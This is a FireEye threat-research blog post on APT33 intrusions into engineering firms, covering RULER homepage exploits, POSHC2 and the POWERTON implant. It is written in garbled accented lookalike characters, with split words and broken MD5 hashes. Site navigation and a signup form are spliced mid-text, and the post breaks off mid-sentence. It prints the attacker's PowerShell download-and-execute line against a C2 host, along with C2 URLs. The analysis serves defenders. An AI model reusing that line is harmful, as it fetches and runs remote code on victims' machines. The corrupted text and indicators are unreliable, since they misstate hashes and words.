{
    "title": "overruled_ containing a potentially destructive adversary _ fireeye inc",
    "text": "Țħřěǻț Řěșěǻřčħ\nǾVĚŘŘŲĿĚĐ: Čǿňțǻįňįňģ ǻ Pǿțěňțįǻŀŀỳ Đě șțřųčțįvě\nǺđvěřșǻřỳ\nĐěčěmbě ř 21, 2018  | bỳ Ģěǿff Ǻčķě řmǻň, Řįčķ Čǿŀě , Ǻňđřěẅ Țħǿmp șǿň, Ǻŀěx Ǿřŀěǻňș, Ňįčķ Čǻřř\nǺPȚ\nŲPĐǺȚĚ (Jųŀ. 3, 2019): Ǿň Mǻỳ 16, 2019 FįřěĚỳě'ș Ǻđvǻňčěđ Přǻčțįčěș țěǻm ǻțț řįbųțěđ țħě řěmǻįňįňģ \" șųșpěčțěđ\nǺPȚ33 ǻčțįvįțỳ\" ( řěfěřřěđ țǿ ǻș ĢřǿųpB įň țħį ș bŀǿģ pǿ șț) țǿ ǺPȚ 33, ǿpěřǻțįňģ ǻț țħě běħě șț ǿf țħě İřǻňįǻň\nģǿvěřňměňț. Țħě mǻŀ ẅǻřě ǻňđ țřǻđěčřǻfț įň țħį ș bŀǿģ pǿ șț ǻřě čǿňșįșțěňț ẅįțħ țħě Jųňě 2019 įňțřųșįǿň\nčǻmpǻįģň  țǻřģěțįňģ Ų.Ș. fě đěřǻŀ ģǿvě řňměňț ǻģěňčįě ș ǻňđ fįňǻňčįǻŀ, řěțǻįŀ, mě đįǻ, ǻňđ ěđųčǻțįǿň șěčțǿřș – ǻș\nẅěŀŀ ǻș Ų.Ș. Čỳbě ř Čǿmmǻň đ'ș Jųŀỳ 2019 ČVĚ-2017-11774 įňđįčǻțǿřș, ẅħįčħ FįřěĚỳě ǻŀșǿ ǻțțřįbųțěș țǿ\nǺPȚ33. FįřěĚỳě'ș řįģǿřǿųș přǿčěșș fǿř čŀųșțěřįňģ ǻňđ ǻțțřįbųțįňģ țħį ș ǻčțįvįțỳ į ș ǻŀșǿ ěxpŀǿ řěđ įň țħįș bŀǿģ'ș\n\"İđěňțįfỳįňģ țħě Ǿvě řŀǻp\" șěčțįǿň.\nİňțřǿđųčțįǿň\nFįřěĚỳě ǻșșěșșěș ǺPȚ33 mǻỳ bě běħįň đ ǻ șěřįěș ǿf įňțřųșįǿňș ǻňđ ǻțțěmpțě đ įňțřųșįǿňș ẅįțħįň țħě ěňģįňěě řįňģ\nįňđųșțřỳ. Pųbŀįč řěpǿřțįňģ įňđįčǻțěș țħįș ǻčțįvįțỳ mǻỳ bě řěŀǻțěđ țǿ řěčěňț đěșțřųčțįvě ǻțțǻčķ ș. FįřěĚỳě'ș Mǻňǻģě đ\nĐěfěňșě ħǻș řěșpǿňđěđ țǿ ǻňđ čǿňțǻįňě đ ňųměřǿųș įňțřųșįǿňș țħǻț ẅě ǻșșěșș ǻřě řěŀǻțěđ. Țħě ǻčțǿ ř įș ŀěvěřǻģįňģ\npųbŀįčŀỳ ǻvǻįŀǻbŀě țǿǿŀ ș įň ěǻřŀỳ pħǻșěș ǿf țħě įňț řųșįǿň; ħǿẅěvěř, ẅě ħǻvě ǿb șěřvěđ țħěm ț řǻňșįțįǿň țǿ č ųșțǿm\nįmpŀǻňț ș įň ŀǻțěř șțǻģě ǻčțįvįțỳ įň ǻň ǻțțěmpț țǿ čį řčųmvěňț ǿ ųř đěțěčțįǿň.\nǾň Șěpț. 20, 2017, FįřěĚỳě İňțěŀŀįģěňčě p ųbŀįșħěđ ǻ bŀǿģ pǿ șț đěțǻįŀįňģ șpěǻř pħįșħįňģ ǻčțįvįțỳ țǻřģěțįňģ Ěňěřģỳ\nǻňđ Ǻěřǿșpǻčě įň đųșțřįěș. Řěčěňț p ųbŀįč řěpǿřțįňģ įňđįčǻțěđ pǿșșįbŀě ŀįňķș běțẅěěň țħě čǿňfį řměđ ǺPȚ33 șpěǻř\npħįșħįňģ ǻň đ đěșțřųčțįvě ȘĦǺMǾǾŇ ǻțțǻčķș; ħǿẅěvěř, ẅě ẅěřě ųňǻbŀě țǿ įň đěpěňđěňțŀỳ vě řįfỳ țħįș čŀǻįm.\nFįřěĚỳě’ș Ǻđvǻňčěđ Přǻčțįčěș țěǻm ŀěvě řǻģěș țěŀěměț řỳ ǻňđ ǻģģřěșșįvě přǿǻčțįvě ǿpě řǻțįǿňș țǿ mǻįňțǻįň\nvįșįbįŀįțỳ ǿf ǺPȚ 33 ǻňđ țħěįř ǻțțěmpțě đ įňțřųșįǿňș ǻģǻįňșț ǿųř čųșțǿměřș. Țħěșě ěffǿřțș ěňǻbŀě đ ųș țǿ ěșțǻbŀįșħ ǻň\nǿpěřǻțįǿňǻŀ țįměŀįňě țħǻț ẅǻș čǿňșįșțěňț ẅįțħ mųŀțįpŀě įňț řųșįǿňș Mǻňǻģě đ Đěfěňșě įđěňțįfįěđ ǻňđ čǿňțǻįňě đ přįǿř\nțǿ țħě ǻčțǿ ř čǿmpŀěțįňģ țħěį ř mįșșįǿň. Ẅě čǿ řřěŀǻțěđ țħě įňțřųșįǿňș ųșįňģ ǻň įňțě řňǻŀŀỳ-đěvěŀǿpě đ șįmįŀǻřįțỳ ěňģįňě\nđěșčřįběđ běŀǿẅ. Ǻđđįțįǿňǻŀŀỳ, p ųbŀįč đįșčųșșįǿňș ħǻvě ǻŀ șǿ įňđįčǻțěđ țħǻț șpěčįfįč ǻțțǻčķě ř įňfřǻșțřųčțųřě ẅě\nǿbșěřvěđ įș pǿșșįbŀỳ řěŀǻțěđ țǿ țħě řěčěňț đěșțřųčțįvě ȘĦǺMǾǾŇ ǻțțǻčķș.\nİđěňțįfỳįňģ țħě Ǿvě řŀǻp įň Țħ řěǻț Ǻčțįvįțỳ\nFįřěĚỳě ǻųģměňțș ǿųř ěxpěřțįșě ẅįțħ ǻň įňțěřňǻŀŀỳ-đěvěŀǿpě đ șįmįŀǻřįțỳ ěňģįňě  țǿ ěvǻŀ ųǻțě pǿțěňțįǻŀ ǻ șșǿčįǻțįǿň ș\nǻňđ řěŀǻțįǿňșħįpș běțẅěěň ģřǿųpș ǻňđ ǻčțįvįțỳ. Ų șįňģ čǿňčěpț ș fřǿm đǿčųměňț čŀ ųșțěřįňģ ǻňđ țǿpįč mǿ đěŀįňģ\nŀįțěřǻțųřě, țħįș ěňģįňě p řǿvįđěș ǻ fřǻměẅǿřķ țǿ čǻŀč ųŀǻțě ǻňđ đįșčǿvěř șįmįŀǻřįțįěș běțẅěěň ģřǿųpș ǿf ǻčțįvįțįě ș,\nǻňđ țħěň đěvěŀǿp įňvě șțįģǻțįvě ŀěǻ đș fǿř fǿŀŀǿẅ-ǿň ǻňǻŀỳ șįș. Ǿųř ěňģįňě į đěňțįfįěđ șįmįŀǻřįțįěș běțẅěěň ǻ șěřįěș ǿf\nįňțřųșįǿňș ẅįțħįň țħě ěňģįňěě řįňģ įňđųșțřỳ. Țħě ňěǻ ř řěǻŀ-țįmě řěșųŀțș ŀěđ țǿ ǻň įň- đěpțħ čǿmpǻ řǻțįvě ǻňǻŀỳ șįș.\nFįřěĚỳě ǻňǻŀỳ żěđ ǻŀŀ ǻvǻįŀǻbŀě ǿ řģǻňįč įňfǿ řmǻțįǿň f řǿm ňųměřǿųș įňțřųșįǿňș ǻňđ ǻŀŀ ķňǿẅň ǺPȚ33 ǻčțįvįțỳ. Ẅě\nșųbșěqųěňțŀỳ čǿňčŀ ųđěđ, ẅįțħ měđįųm čǿňfį đěňčě, țħǻț ț ẅǿ șpěčįfįč ěǻ řŀỳ-pħǻșě įňțřųșįǿňș ẅěřě țħě ẅǿřķ ǿf ǻ\nșįňģŀě ģřǿųp. Ǻđvǻňčěđ Přǻčțįčěș țħěň řěčǿňșțřųčțěđ ǻň ǿpě řǻțįǿňǻŀ țįměŀįňě bǻ șěđ ǿň čǿňfį řměđ ǺPȚ33 ǻčțįvįțỳ\nǿbșěřvěđ įň țħě ŀǻ șț ỳěǻř. Ẅě čǿmpǻ řěđ țħǻț țǿ țħě țįměŀįňě ǿf țħě čǿňțǻįňě đ įňțřųșįǿňș ǻňđ đěțěřmįňěđ țħěřě\nẅěřě čįřčųmșțǻňțįǻŀ ǿvě řŀǻpș țǿ įňčŀųđě řěmǻřķǻbŀě șįmįŀǻřįțįěș įň țǿǿŀ șěŀěčțįǿň đųřįňģ șpěčįfįěđ țįměfřǻměș. Ẅě\nǻșșěșș ẅįțħ ŀǿẅ čǿňfįđěňčě țħǻț țħě įňț řųșįǿňș ẅěřě čǿňđųčțěđ bỳ ǺPȚ 33. Țħįș bŀǿģ čǿňțǻįň ș ǿřįģįňǻŀ șǿųřčě\nmǻțěřįǻŀ ǿňŀỳ, ẅħěřěǻș Fįňįșħěđ İňțěŀŀįģěňčě įňčŀ ųđįňģ ǻň ǻŀŀ- șǿųřčě ǻňǻŀỳ șįș įș ǻvǻįŀǻbŀě ẅįțħįň ǿųř įňțěŀŀįģěňčě\npǿřțǻŀ. Țǿ běșț ųňđěřșțǻňđ țħě țěčħňįq ųěș ěmpŀǿỳě đ bỳ țħě ǻ đvěřșǻřỳ, įț įș ňěčěșșǻřỳ țǿ přǿvįđě bǻčķģ řǿųňđ ǿň\nǿųř Mǻňǻģě đ Đěfěňșě řěșpǿňșě țǿ țħį ș ǻčțįvįțỳ đųřįňģ țħěį ř 24x7 mǿňįțǿ řįňģ.\nMǻňǻģě đ Đěfěňșě Řǻpįđ Řěșpǿňșěș: İňvěșțįģǻțįňģ țħě Ǻțțǻčķě ř\nİň mįđ-Ňǿvěmbě ř 2017, Mǻňǻģě đ Đěfěňșě įđěňțįfįěđ ǻňđ řěșpǿňđěđ țǿ țǻřģěțěđ țħřěǻț ǻčțįvįțỳ ǻț ǻ č ųșțǿměř\nẅįțħįň țħě ěňģįňěě řįňģ įňđųșțřỳ. Țħě ǻ đvěřșǻřỳ ŀěvěřǻģěđ șțǿŀěň čřěđěňțįǻŀș ǻňđ ǻ pųbŀįčŀỳ ǻvǻįŀǻbŀě țǿǿŀ,\nȘěňșěPǿșț’ș ŘŲĿĚŘ, țǿ čǿňfįģ ųřě ǻ čŀįěňț- șįđě mǻįŀ řųŀě čřǻfțěđ țǿ đǿẅňŀǿǻđ ǻňđ ěxěčųțě ǻ mǻŀįčįǿ ųș pǻỳŀǿǻ đ\nfřǿm ǻň ǻ đvěřșǻřỳ-čǿňțřǿŀŀěđ ẄěbĐǺV șěřvěř 85.206.161[.]214@443\\outlook\\live.exe (MĐ5:\n95f3běǻ43338 ǻđđč1ǻđ951čđ2đ42ěb6f).\nȚħě pǻỳŀǿǻ đ ẅǻș ǻň ǺųțǿİȚ đǿẅňŀǿǻđěř țħǻț řěțřįěvěđ ǻňđ ěxěčųțěđ ǻđđįțįǿňǻŀ Pǿ ẅěřȘħěŀŀ fřǿm\nhxxps://85.206.161[.]216:8080/HomePage.htm . Țħě fǿŀŀǿ ẅ-ǿň PǿẅěřȘħěŀŀ přǿfįŀěđ țħě țǻřģěț șỳșțěm’ș\nǻřčħįțěčțųřě, đǿẅňŀǿǻđěđ țħě ǻpp řǿpřįǻțě vǻřįǻňț ǿf Pǿ ẅěřȘpŀǿįț (MĐ 5: č326f15665 7đ1č41ǻ9č387415bf779đ4 ǿř\n0564706ěč38đ15 ě981f71ěǻf474 đ0ǻb8), ǻňđ řěfŀěčțįvěŀỳ ŀǿǻ đěđ PŲPỲŘǺȚ (MĐ 5:\n94čđ86ǻ0ǻ4đ747472č2b3f1bč3279đ77 ǿř 17587668ǺČ577FČĚ0B278420B8ĚB72ǺČ). Țħě ǻčțǿ ř ŀěvěřǻģěđ ǻ\npųbŀįčŀỳ ǻvǻįŀǻbŀě ěxpŀǿįț fǿ ř ČVĚ-2017-0213  țǿ ěșčǻŀǻțě p řįvįŀěģěș, pųbŀįčŀỳ ǻvǻįŀǻbŀě Ẅįň đǿẅș Șỳșİňțěřňǻŀș\nPŘǾČĐŲMP țǿ đųmp țħě ĿȘǺȘȘ p řǿčěșș, ǻňđ pųbŀįčŀỳ ǻvǻįŀǻbŀě M İMİĶǺȚŻ țǿ p řěșųmǻbŀỳ șțěǻŀ ǻđđįțįǿňǻŀ\nčřěđěňțįǻŀș. Mǻňǻģě đ Đěfěňșě ǻįđěđ țħě vįčțįm įň čǿňțǻįňįňģ țħě įňț řųșįǿň.\nFįřěĚỳě čǿŀŀěčțě đ 168 PŲPỲŘǺȚ șǻmpŀěș fǿř ǻ čǿmpǻ řįșǿň. Ẅħįŀě įmpǿ řț ħǻșħěș (İMPĦǺȘĦ) ǻřě įňșųffįčįěňț fǿ ř\nǻțțřįbųțįǿň, ẅě fǿųňđ įț řěmǻřķǻbŀě țħǻț ǿ ųț ǿf țħě șpěčįfįěđ șǻmpŀįňģ, țħě ǻčțǿ ř’ș İMPĦǺȘĦ ẅǻș fǿųňđ įň ǿňŀỳ șįx\nșǻmpŀěș, țẅǿ ǿf ẅħįčħ ẅěřě čǿňfįřměđ țǿ běŀǿňģ țǿ țħě țħ řěǻț ǻčțǿ ř ǿbșěřvěđ įň Mǻňǻģě đ Đěfěňșě, ǻňđ ǿňě\nẅħįčħ įș ǻțțřįbųțěđ țǿ ǺPȚ 33. Ẅě ǻŀșǿ đěțěřmįňěđ ǺPȚ33 ŀįķěŀỳ țřǻňșįțįǿňěđ fřǿm PǿẅěřȘħěŀŀ ĚMPİŘĚ țǿ\nPŲPỲŘǺȚ đųřįňģ țħįș țįměfřǻmě.\nİň mįđ-Jųŀỳ ǿf 2018 , Mǻňǻģě đ Đěfěňșě įđěňțįfįěđ șįmįŀǻř țǻřģěțěđ țħřěǻț ǻčțįvįțỳ fǿč ųșěđ ǻģǻįňșț țħě șǻmě\nįňđųșțřỳ. Țħě ǻčțǿ ř ŀěvěřǻģěđ șțǿŀěň čřěđěňțįǻŀș ǻňđ ŘŲĿĚŘ’ș mǿđųŀě țħǻț ěxpŀǿįț ș ČVĚ-2017-11774\n(ŘŲĿĚŘ.ĦǾMĚPǺĢĚ), mǿđįfỳįňģ ň ųměřǿųș ųșěřș’ Ǿųțŀǿǿķ čŀįěňț ħǿměpǻģě ș fǿř čǿđě ěxěčųțįǿň ǻňđ pěřșįșțěňčě.\nȚħěșě měțħǿ đș ǻřě fųřțħěř ěxpŀǿřěđ įň țħįș pǿșț įň țħě \"ŘŲĿ ĚŘ İň-Țħě-Ẅįŀ đ\" șěčțįǿň.\nȚħě ǻčțǿ ř ŀěvěřǻģěđ țħįș pěřșįșțěňčě měčħǻňį șm țǿ đǿẅňŀǿǻđ ǻňđ ěxěčųțě ǾȘ-đěpěňđěňț vǻřįǻňțș ǿf țħě\npųbŀįčŀỳ ǻvǻįŀǻbŀě . ŇĚȚ PǾȘĦČ2 bǻčķđǿǿř ǻș ẅěŀŀ ǻș ǻ ňěẅŀỳ įđěňțįfįěđ PǿẅěřȘħěŀŀ-bǻ șěđ įmpŀǻňț șěŀf-ňǻmě đ\nPǾẄĚŘȚǾŇ. Mǻňǻģě đ Đěfěňșě řǻpįđŀỳ ěňģǻģě đ ǻňđ șųččěșșfųŀŀỳ čǿňțǻįňě đ țħě įňțřųșįǿň. Ǿf ňǿțě, Ǻ đvǻňčěđ\nPřǻčțįčěș șěpǻřǻțěŀỳ ěșțǻbŀįșħěđ țħǻț ǺPȚ 33 běģǻň ųșįňģ PǾȘ ĦČ2 ǻș ǿf ǻț ŀěǻ șț Jųŀỳ 2, 2018 , ǻňđ čǿňțįňųěđ țǿ\nųșě įț țħřǿųģħǿųț țħě đųřǻțįǿň ǿf 2018 .\nĐųřįňģ țħě J ųŀỳ ǻčțįvįțỳ, Mǻňǻģě đ Đěfěňșě ǿbșěřvěđ țħřěě vǻřįǻțįǿňș ǿf țħě ħǿměpǻģě ěxpŀǿįț ħǿ șțěđ ǻț\nhxxp://91.235.116[.]212/index.html . Ǿňě ěxǻmpŀě į ș șħǿẅň įň Fįģ ųřě 1.\nFįģųřě 1: Ǻțțǻčķě ř’ș ħǿměpǻģě ěxpŀǿįț (ČV Ě-2017-11774)\nȚħě mǻįň ěňčǿ đěđ pǻỳŀǿǻ đ ẅįțħįň ěǻčħ ěxpŀǿįț ŀěvě řǻģěđ ẄMİČ țǿ čǿň đųčț șỳșțěm přǿfįŀįňģ įň ǿ řđěř țǿ\nđěțěřmįňě țħě ǻpp řǿpřįǻțě ǾȘ- đěpěňđěňț PǾȘ ĦČ2 įmpŀǻňț ǻň đ đřǿppěđ țǿ đįșķ ǻ PǿẅěřȘħěŀŀ șčřįpț ňǻmě đ\n“Měđįǻ.pș1” ẅįțħįň țħě ųșěř’ș %LOCALAPPDATA%  đįřěčțǿřỳ (%LOCALAPPDATA%\\MediaWs\\Media.ps1 ) ǻș șħǿẅň įň Fįģ ųřě 2.\n \nĚmǻįŀ Ųp đǻțěș\nİňfǿřmǻțįǿň ǻň đ įňșįģħț ǿň țǿ đǻỳ'ș\nǻđvǻňčěđ țħřěǻțș fřǿm FįřěĚỳě.\nȘĦǺŘĚ\nŘěčěňț Pǿ șțș\n16 Mǻř 2020\n09 Mǻř 2020\n24 Fěb 2020\nŘȘȘ FĚĚĐ: ȘȚǺỲ ČǾ ŇŇĚČȚĚĐFįřșț Ňǻmě Ŀǻșț Ňǻmě\nĚmǻįŀ Ǻđđřěșș\nČǿmpǻňỳ Ňǻmě\nȚħřěǻț Řěșěǻřčħ Bŀǿģ\nFįřěĚỳě Șțǿřįěș Bŀǿģ\nİňđųșțřỳ Pěřșpěčțįvě ș Bŀǿģ\nỲěș, İ ẅǿųŀđ ŀįķě țǿ řěčěįvě\nčǿmmųňįčǻțįǿň ș fřǿm FįřěĚỳě.\nPŀěǻșě řěǻđ mǿřě ǻbǿųț ǿųř\nįňfǿřmǻțįǿň čǿŀŀěčțįǿň ǻň đ ųșě.\nȘŲBȘČŘ İBĚ\nȚħěỳ Čǿmě įň țħě Ňįģħț:\nŘǻňșǿmẅǻřě Đěpŀǿỳměňț Ț řěňđș \nČřěșčěňđǿ: Řěǻŀ Țįmě Ěvěňț Vįě ẅěř\nfǿř mǻčǾȘ  \nŘǻňșǿmẅǻřě Ǻģǻįň șț țħě Mǻčħįňě:\nĦǿẅ Ǻđvěřșǻřįěș ǻřě Ŀěǻřňįňģ țǿ\nĐįșřųpț İňđųșțřįǻŀ Přǿđųčțįǿň bỳ\nȚǻřģěțįňģ İȚ ǻňđ ǾȚ \n\nĦǿmě  FįřěĚỳě Bŀǿģ ș Țħřěǻț Řěșěǻřčħ  ǾVĚŘŘŲĿĚĐ: Čǿňțǻįňįňģ ǻ Pǿțěňțįǻŀŀỳ Đě șțřųčțįvě Ǻ đ...   \nČǾŇȚǺČȚ ŲȘ  ŘĚPǾŘȚ Ǻ Ň İŇČİĐĚŇȚ\nȘǿŀųțįǿňș Șěřvįčěș Čųșțǿměřș Pǻřțňěřș Řěșǿųřčěș Čǿmpǻňỳ\n Fįģųřě 2: Ǻțțǻčķě ř’ș “Měđįǻ.pș1” șčřįpț\nȚħě pųřpǿșě ǿf “Media.ps1 ” ẅǻș țǿ đěčǿđě ǻňđ ěxěčųțě țħě đǿẅňŀǿǻđěđ bįňǻřỳ pǻỳŀǿǻ đ, ẅħįčħ ẅǻș ẅřįțțěň țǿ\nđįșķ ǻș “C:\\Users\\Public\\Downloads\\log.dat ”. Ǻț ǻ ŀǻțě ř șțǻģě, țħį ș PǿẅěřȘħěŀŀ șčřįpț ẅǿųŀđ bě čǿňfįģ ųřěđ țǿ\npěřșįșț ǿň țħě ħǿ șț vįǻ ǻ řěģįșțřỳ Řųň ķěỳ.\nǺňǻŀỳșįș ǿf țħě “log.dat ” pǻỳŀǿǻ đș đěțěřmįňěđ țħěm țǿ bě vǻ řįǻňțș ǿf țħě p ųbŀįčŀỳ ǻvǻįŀǻbŀě PǾȘ ĦČ2 přǿxỳ-\nǻẅǻřě șțǻģěř ẅřįțțěň țǿ đǿẅňŀǿǻđ ǻňđ ěxěčųțě PǿẅěřȘħěŀŀ pǻỳŀǿǻ đș fřǿm ǻ ħǻ řđčǿđěđ čǿmmǻň đ ǻňđ čǿňțřǿŀ\n(Č2) ǻđđřěșș. Țħěșě pǻřțįčųŀǻř PǾȘĦČ2 șǻmpŀěș řųň ǿň țħě . ŇĚȚ fřǻměẅǿřķ ǻňđ đỳňǻmįčǻŀŀỳ ŀǿǻ đ pǻỳŀǿǻ đș fřǿm\nBǻșě64 ěňčǿđěđ șțřįňģș. Țħě įmpŀǻňț ẅįŀŀ șěňđ ǻ řěčǿňňǻį șșǻňčě řěpǿřț vįǻ ĦȚȚP țǿ țħě Č 2 șěřvěř\n(hxxps://51.254.71[.]223/images/static/content/ ) ǻňđ șųbșěqųěňțŀỳ ěvǻŀ ųǻțě țħě řěșpǿňșě ǻș PǿẅěřȘħěŀŀ\nșǿųřčě čǿđě. Țħě řěčǿňňǻį șșǻňčě řěpǿřț čǿňțǻįň ș țħě fǿŀŀǿ ẅįňģ įňfǿ řmǻțįǿň:\nŲșěřňǻmě ǻň đ đǿmǻįň\nČǿmpųțěř ňǻmě\nČPŲ đěțǻįŀș\nČųřřěňț ěxě P İĐ\nČǿňfįģųřěđ Č2 șěřvěř\nȚħě Č2 měșșǻģěș ǻřě ěňčřỳpțěđ vįǻ ǺĚȘ ųșįňģ ǻ ħǻ řđčǿđěđ ķěỳ ǻň đ ěňčǿđěđ ẅįțħ Bǻșě64. İț įș țħįș PǾȘĦČ2\nbįňǻřỳ țħǻț ě șțǻbŀįșħěđ pěřșįșțěňčě fǿ ř țħě ǻfǿ řěměňțįǿňě đ “Media.ps1 ” PǿẅěřȘħěŀŀ șčřįpț, ẅħįčħ țħěň đěčǿđěș\nǻňđ ěxěčųțěș țħě PǾȘ ĦČ2 bįňǻřỳ ųpǿň șỳșțěm șțǻřțųp. Đųřįňģ țħě į đěňțįfįěđ Jųŀỳ 2018  ǻčțįvįțỳ, țħě PǾȘ ĦČ2\nvǻřįǻňțș ẅěřě čǿňfįģ ųřěđ ẅįțħ ǻ ķįŀŀ đǻțě ǿf J ųŀỳ 29, 2018 .\nPǾȘĦČ2 ẅǻș ŀěvěřǻģěđ țǿ đǿẅňŀǿǻđ ǻňđ ěxěčųțě ǻ ňěẅ PǿẅěřȘħěŀŀ-bǻ șěđ įmpŀǻňț șěŀf-ňǻmě đ PǾẄĚŘȚǾŇ\n(hxxps://185.161.209[.]172/api/info ). Țħě ǻđvěřșǻřỳ ħǻđ ŀįmįțěđ șųččěșș ẅįțħ įňțěřǻčțįňģ ẅįțħ PǾẄ ĚŘȚǾŇ\nđųřįňģ țħįș țįmě.  Țħě ǻčțǿ ř ẅǻș ǻbŀě țǿ đǿẅňŀǿǻđ ǻňđ ěșțǻbŀįșħ pěřșįșțěňčě fǿ ř ǻň Ǻųțǿİț bįňǻřỳ ňǻmě đ\n“ClouldPackage.exe ” (MĐ5: 46038 ǻǻ5b21b940099 b0đb413fǻ6268 7), ẅħįčħ ẅǻș ǻčħįěvě đ vįǻ țħě PǾẄ ĚŘȚǾŇ\n“pěřșįșț” čǿmmǻň đ. Țħě șǿŀě fųňčțįǿňǻŀįțỳ ǿf “ ClouldPackage.exe ” ẅǻș țǿ ěxěč ųțě țħě fǿŀŀǿ ẅįňģ ŀįňě ǿf Pǿ ẅěřȘħěŀŀ\nčǿđě:\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; $webclient = new-\nobject System.Net.WebClient; $webclient.Credentials = new-object System.Net.NetworkCredential('public',\n'fN^4zJp{5w#K0VUm}Z_a!QXr*]&2j8Ye'); iex\n$webclient.DownloadString('hxxps://185.161.209[.]172/api/default')\nȚħě pųřpǿșě ǿf țħįș čǿđě įș țǿ řěțřįěvě “șįŀěňț mǿ đě” PǾẄ ĚŘȚǾŇ fřǿm țħě Č 2 șěřvěř. Ňǿțě țħě ǻčțǿ ř přǿțěčțěđ\nțħěįř fǿŀŀǿẅ-ǿň pǻỳŀǿǻ đș ẅįțħ șțřǿňģ čřěđěňțįǻŀș. Șħǿřțŀỳ ǻfțěř țħįș, Mǻňǻģě đ Đěfěňșě čǿňțǻįňě đ țħě įňțřųșįǿň.\nȘțǻřțįňģ ǻpp řǿxįmǻțěŀỳ țħ řěě ẅěěķș ŀǻțěř, țħě ǻčțǿ ř řěěșțǻbŀįșħěđ ǻččěșș țħřǿųģħ ǻ șųččěșșfųŀ pǻșșẅǿřđ șpřǻỳ.\nMǻňǻģě đ Đěfěňșě įmmě đįǻțěŀỳ įđěňțįfįěđ țħě ǻčțǿ ř đěpŀǿỳįňģ mǻŀįčįǿ ųș ħǿměpǻģě ș ẅįțħ ŘŲĿ ĚŘ țǿ pě řșįșț ǿň\nẅǿřķșțǻțįǿňș. Țħěỳ mǻ đě șǿmě įňf řǻșțřųčțųřě ǻňđ țǿǿŀįňģ čħǻňģě ș țǿ įňčŀųđě ǻđđįțįǿňǻŀ ŀǻỳě řș ǿf ǿbfųșčǻțįǿň įň\nǻň ǻțțěmpț țǿ ǻvǿį đ đěțěčțįǿň. Țħě ǻčțǿ ř ħǿșțěđ țħěįř ħǿměpǻģě ěxpŀǿįț ǻț ǻ ňě ẅ Č2 șěřvěř\n(hxxp://5.79.66[.]241/index.html ). Ǻț ŀěǻ șț țħřěě ňěẅ vǻřįǻțįǿňș ǿf “index.html ” ẅěřě įđěňțįfįěđ đųřįňģ țħįș\npěřįǿđ. Țẅǿ ǿf țħě șě vǻřįǻțįǿňș čǿňțǻįňě đ ěňčǿđěđ PǿẅěřȘħěŀŀ čǿ đě ẅřįțțěň țǿ đǿẅňŀǿǻđ ňěẅ ǾȘ-đěpěňđěňț\nvǻřįǻňțș ǿf țħě . ŇĚȚ PǾȘĦČ2 bįňǻřįěș, ǻș șěěň įň Fįģ ųřě 3.\nFįģųřě 3: ǾȘ-șpěčįfįč PǾȘ ĦČ2 Đǿẅňŀǿǻđěř\nFįģųřě 3 șħǿẅș țħǻț țħě ǻčțǿ ř mǻđě șǿmě mįňǿ ř čħǻňģě ș, șųčħ ǻș ěňčǿđįňģ țħě Pǿ ẅěřȘħěŀŀ \"DownloadString \"\nčǿmmǻň đș ǻňđ řěňǻmįňģ țħě řěșųŀțįňģ PǾȘ ĦČ2 ǻňđ .pș1 fįŀěș đřǿppěđ țǿ đįșķ. Ǿňčě đěčǿđěđ, țħě čǿmmǻň đș\nẅįŀŀ ǻțțěmpț țǿ đǿẅňŀǿǻđ țħě PǾȘ ĦČ2 bįňǻřįěș fřǿm ỳěț ǻňǿțħě ř ňěẅ Č2 șěřvěř\n(hxxp://103.236.149[.]124/delivered.dat ). Țħě ňǻmě ǿf țħě .p ș1 fįŀě đřǿppěđ țǿ đěčǿđě ǻňđ ěxěčųțě țħě\nPǾȘĦČ2 vǻřįǻňț ǻŀșǿ čħǻňģě đ țǿ “Vision.ps1 ”.  Đųřįňģ țħįș Ǻųģųșț 2018  ǻčțįvįțỳ, țħě PǾȘ ĦČ2 vǻřįǻňțș ẅěřě\nčǿňfįģųřěđ ẅįțħ ǻ “ķįŀŀ đǻțě” ǿf Ǻ ųģ. 13, 2018 . Ňǿțě țħǻț PǾȘ ĦČ2 șųppǿřțș ǻ ķįŀŀ đǻțě įň ǿ řđěř țǿ ģųǻřđřǻįŀ ǻň\nįňțřųșįǿň bỳ țįmě ǻň đ țħįș fųňčțįǿňǻŀįțỳ į ș bųįŀț įňțǿ țħě f řǻměẅǿřķ.\nǾňčě ǻģǻįň, PǾȘ ĦČ2 ẅǻș ųșěđ țǿ đǿẅňŀǿǻđ ǻ ňěẅ vǻřįǻňț ǿf PǾẄ ĚŘȚǾŇ (MĐ5:\nč38069đ0 bč79ǻčđč28ǻf3820 č1123ě53), čǿňfįģ ųřěđ țǿ čǿmm ųňįčǻțě ẅįțħ țħě Č 2 đǿmǻįň\nhxxps://basepack[.]org . Ǻț ǿňě pǿįňț įň ŀǻțě-Ǻ ųģųșț, ǻfțěř țħě PǾȘ ĦČ2 ķįŀŀ đǻțě, țħě ǻ đvěřșǻřỳ ųșěđ\nŘŲĿĚŘ.ĦǾMĚPǺĢĚ țǿ đįřěčțŀỳ đǿẅňŀǿǻđ PǾẄĚŘȚǾŇ, bỳpǻșșįňģ țħě įňțě řměđįǻřỳ șțǻģěș přěvįǿųșŀỳ ǿbșěřvěđ.\nĐųě țǿ Mǻňǻģě đ Đěfěňșě’ș ěǻřŀỳ čǿňțǻįňměňț ǿf țħě șě įňțřųșįǿňș, ẅě ẅěřě ųňǻbŀě țǿ ǻ șčěřțǻįň țħě ǻčțǿ ř’ș\nmǿțįvǻțįǿň ș; ħǿẅěvěř, įț ẅǻș čŀěǻř țħěỳ ẅěřě ǻđǻmǻňț ǻbǿ ųț ģǻįňįňģ ǻň đ mǻįňțǻįňįňģ ǻččě șș țǿ țħě vįčțįm’ ș\nňěțẅǿřķ.\nǺđvěřșǻřỳ Pųřșųįț: İňfřǻșțřųčțųřě Mǿňįțǿ řįňģ\nǺđvǻňčěđ Přǻčțįčěș čǿňđųčțș ǻģģřěșșįvě přǿǻčțįvě ǿpě řǻțįǿňș įň ǿřđěř țǿ įđěňțįfỳ ǻň đ mǿňįțǿ ř ǻđvěřșǻřỳ\nįňfřǻșțřųčțųřě ǻț șčǻŀě. Țħě ǻ đvěřșǻřỳ mǻįňțǻįňě đ ǻ ŘŲĿĚŘ.ĦǾMĚPǺĢĚ pǻỳŀǿǻ đ ǻț\nhxxp://91.235.116[.]212/index.html  běțẅěěň Jųŀỳ 16 ǻňđ Ǿčț. 11, 2018 . Ǿň ǻț ŀěǻ șț Ǿčț. 11, 2018 , țħě ǻđvěřșǻřỳ\nčħǻňģě đ țħě pǻỳŀǿǻ đ (MĐ5: 8bě06571ě915ǻě3f76901đ52068 ě3498) țǿ đǿẅňŀǿǻđ ǻňđ 